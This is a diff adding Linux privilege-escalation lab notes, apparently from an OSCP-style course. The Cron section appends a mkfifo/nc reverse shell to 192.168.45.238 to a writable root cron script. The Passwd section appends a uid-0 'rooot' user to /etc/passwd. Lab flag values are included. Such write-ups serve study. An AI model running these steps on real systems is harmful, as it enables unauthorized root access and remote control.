@@ -77,3 +77,60 @@ watch -n 5 "ps -aux | grep OS{"
 
 # Insecure File Permissions
 
+## Cron
+2. Connect to VM 2 and look for another misconfigured cron job. Once found, exploit it and obtain a root shell in order to get a flag.
+```bash
+# Find insecure cron job
+grep -i "cron" /var/log/syslog
+	May  1 22:22:31 debian-privesc CRON[1318]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
+	May  1 22:22:37 debian-privesc crontab[1338]: (root) LIST (root)
+	May  1 22:22:37 debian-privesc crontab[1340]: (root) REPLACE (root)
+	May  1 22:23:01 debian-privesc cron[505]: (root) RELOAD (crontabs/root)
+	May  1 22:23:01 debian-privesc CRON[1368]: (root) CMD (/bin/bash /tmp/this_is_fine.sh)
+	May  1 22:23:01 debian-privesc CRON[1369]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
+	May  1 22:23:01 debian-privesc CRON[1367]: (CRON) info (No MTA installed, discarding output)
+
+# Verify writeable
+ls -l /tmp/this_is_fine.sh
+	-rwxrwxrw- 1 root root 12 May  1 22:22 /tmp/this_is_fine.sh
+
+# Add shell via named pipe
+echo >> /tmp/this_is_fine.sh
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.238 5555 >/tmp/f" >> /tmp/this_is_fine.sh
+
+# Start nc listener on attacker vm & grab flag
+nc -nlvp 5555
+	listening on [any] 5555 ...
+	connect to [192.168.45.238] from (UNKNOWN) [192.168.180.214] 52542
+	/bin/sh: 0: can''t access tty; job control turned off
+ls
+	flag.txt
+cat flag.txt
+	OS{0e42cb3b8c8b22e3f79e1cf1c4e0f11e}
+```
+
+
+## Passwd Auth
+Connect to VM 2 and get the flag by elevating to a root shell through password authentication abuse.
+```bash
+# Create hash
+openssl passwd letsgo
+	XDEq5.4QkkVVM
+
+# Add user/ passwd
+echo "rooot:XDEq5.4QkkVVM:0:0:root:/root:/bin/bash" >> /etc/passwd
+
+# su to new user & grab flag
+su rooot
+	Password: 
+
+whoami
+	root
+
+cd /root
+ls
+	flag.txt
+
+cat flag.txt
+	OS{86d5ee4209a4acf3b68489772581026d}
+```
